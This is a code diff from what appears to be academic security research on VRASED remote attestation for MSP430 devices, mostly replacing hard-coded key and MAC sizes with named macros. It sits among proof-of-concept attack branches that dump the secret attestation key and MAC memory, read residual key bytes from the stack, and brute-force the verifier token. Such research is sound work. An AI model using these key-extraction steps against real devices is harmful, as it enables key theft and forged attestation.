@@ -1,4 +1,5 @@
 #include <string.h>
+#include "vrased-config.h"
 
 /**
  * Attack authors: our comments are added as block comments, the original
@@ -7,13 +8,10 @@
 
 /*********** TRUSTED VRASED WRAPPER CODE (inside SW-Att) ***********/
 
-#define MAC_ADDR 0x0230
-#define KEY_ADDR 0x6A00
 #define ATTEST_DATA_ADDR 0xE000
 #define ATTEST_SIZE 0x20
 
 /* Fields for VRASED_A */
-#define CTR_ADDR 0x0270
 #define VRF_AUTH 0x0250
 
 extern void
@@ -36,24 +34,24 @@ hmac(
 
 __attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry()
 {
-  uint8_t key[64] = {0};
-  uint8_t verification[32] = {0};
+  uint8_t key[KEY_SIZE] = {0};
+  uint8_t verification[MAC_SIZE] = {0};
 
-  if (memcmp((uint8_t*) MAC_ADDR, (uint8_t*) CTR_ADDR, 32) > 0)
+  if (memcmp((uint8_t*) MAC_ADDR, (uint8_t*) CTR_ADDR, CTR_SIZE) > 0)
   {
-    memcpy(key, (uint8_t*) KEY_ADDR, 64);
-    hmac((uint8_t*) verification, (uint8_t*) key, (uint32_t) 64, (uint8_t*)MAC_ADDR, (uint32_t) 32);
+    memcpy(key, (uint8_t*) KEY_ADDR, KEY_SIZE);
+    hmac((uint8_t*) verification, (uint8_t*) key, (uint32_t) KEY_SIZE, (uint8_t*)MAC_ADDR, (uint32_t) MAC_SIZE);
 
     // Verifier Authentication before calling HMAC
-    if (memcmp((uint8_t*) VRF_AUTH, verification, 32) == 0)
+    if (memcmp((uint8_t*) VRF_AUTH, verification, MAC_SIZE) == 0)
     {
-      memcpy((uint8_t*) CTR_ADDR, (uint8_t*) MAC_ADDR, 32);
+      memcpy((uint8_t*) CTR_ADDR, (uint8_t*) MAC_ADDR, CTR_SIZE);
 
       // Key derivation function for rest of the computation of HMAC
-      hmac((uint8_t*) key, (uint8_t*) key, (uint32_t) 64, (uint8_t*) verification, (uint32_t) 32);
+      hmac((uint8_t*) key, (uint8_t*) key, (uint32_t) KEY_SIZE, (uint8_t*) verification, (uint32_t) MAC_SIZE);
 
       // HMAC on the attestation region. Stores the result in MAC_ADDR itself.
-      hmac((uint8_t*) MAC_ADDR, (uint8_t*) key, (uint32_t) 32, (uint8_t*) ATTEST_DATA_ADDR, (uint32_t) ATTEST_SIZE);
+      hmac((uint8_t*) MAC_ADDR, (uint8_t*) key, (uint32_t) MAC_SIZE, (uint8_t*) ATTEST_DATA_ADDR, (uint32_t) ATTEST_SIZE);
     }
   }
 
@@ -81,17 +79,17 @@ __attribute__ ((section (".do_mac.call"))) void Hacl_HMAC_SHA2_256_hmac_entry() 
      * initialization below (e.g., as validated with clang-msp430; see also the
      * ../../swatt-init directory).
      * */
-    uint8_t key[64];
+    uint8_t key[KEY_SIZE];
     #else
-    uint8_t key[64] = {0};
+    uint8_t key[KEY_SIZE] = {0};
     #endif
 
     //Copy the key from KEY_ADDR to the key buffer.
-    memcpy(key, (uint8_t*)KEY_ADDR, 64);
-    hmac((uint8_t*) key, (uint8_t*) key, (uint32_t) 64, (uint8_t*) MAC_ADDR, (uint32_t) 32);
+    memcpy(key, (uint8_t*)KEY_ADDR, KEY_SIZE);
+    hmac((uint8_t*) key, (uint8_t*) key, (uint32_t) KEY_SIZE, (uint8_t*) MAC_ADDR, (uint32_t) MAC_SIZE);
     // Uses the result in the key buffer to compute HMAC.
     // Stores the result in HMAC ADDR.
-    hmac((uint8_t*) (MAC_ADDR), (uint8_t*) key, (uint32_t) 32, (uint8_t*) ATTEST_DATA_ADDR, (uint32_t) ATTEST_SIZE);
+    hmac((uint8_t*) (MAC_ADDR), (uint8_t*) key, (uint32_t) MAC_SIZE, (uint8_t*) ATTEST_DATA_ADDR, (uint32_t) ATTEST_SIZE);
 
 	//return;
 
@@ -120,8 +118,6 @@ __attribute__ ((section (".do_mac.leave"))) __attribute__((naked)) void Hacl_HMA
 #define DMA_ATTACKER_RESET_CNT          0x0074
 #define DMA_ATTACKER_COUNTDOWN          0x0076
 #define DMA_ATTACKER_DELAYED            0x0078
-
-#define KEY_SIZE                        64
 
 /**
  * MAC region: [0x0230, 0x250[
@@ -247,13 +243,13 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
         return;
       }
 
-      dump_buf("leak", (uint8_t*) MAC_ADDR, 0, 64);
+      dump_buf("leak", (uint8_t*) MAC_ADDR, 0, KEY_SIZE);
       return;
     #endif
 
     #if __ATTACK == 2
       if (!have_reset)
-        dump_buf("leak", (uint8_t*) KEY_ADDR, 31, 64);
+        dump_buf("leak", (uint8_t*) KEY_ADDR, 31, KEY_SIZE);
       else
         printf("PoC failed\n");
       return;
@@ -261,7 +257,7 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
 
     #if __ATTACK == 3
       if (have_reset) {
-        dump_buf("leak", (uint8_t*) (STACK_POISON_ADDRESS - 64), 0, 22);
+        dump_buf("leak", (uint8_t*) (STACK_POISON_ADDRESS - KEY_SIZE), 0, 22);
         return;
       } else {
         printf("First run\n");
@@ -270,9 +266,9 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
 
     #if __ATTACK == 4 || __ATTACK == 5 || __ATTACK == 6
       //if (!have_reset)
-      //  dump_buf("ctr", (uint8_t*) CTR_ADDR, 0, 32);
+      //  dump_buf("ctr", (uint8_t*) CTR_ADDR, 0, CTR_SIZE);
 
-      my_memset((uint8_t*) VRF_AUTH, 32, 0);
+      my_memset((uint8_t*) VRF_AUTH, MAC_SIZE, 0);
       uint8_t * verification = (uint8_t*) VRF_AUTH;
 
       /* NOTE: Brute-forcing the entire verification token is possible in
@@ -375,7 +371,7 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     #endif
 
     //Copy input challenge to MAC_ADDR:
-    my_memcpy ( (uint8_t*)MAC_ADDR, challenge, 32);
+    my_memcpy ( (uint8_t*)MAC_ADDR, challenge, MAC_SIZE);
 
     #if __ATTACK == 5
     /* enable interrupts */
@@ -465,5 +461,5 @@ void VRASED (uint8_t *challenge, uint8_t *response) {
     #endif
 
     // Return the HMAC value to the application:
-    my_memcpy(response, (uint8_t*)MAC_ADDR, 32);
+    my_memcpy(response, (uint8_t*)MAC_ADDR, MAC_SIZE);
 }
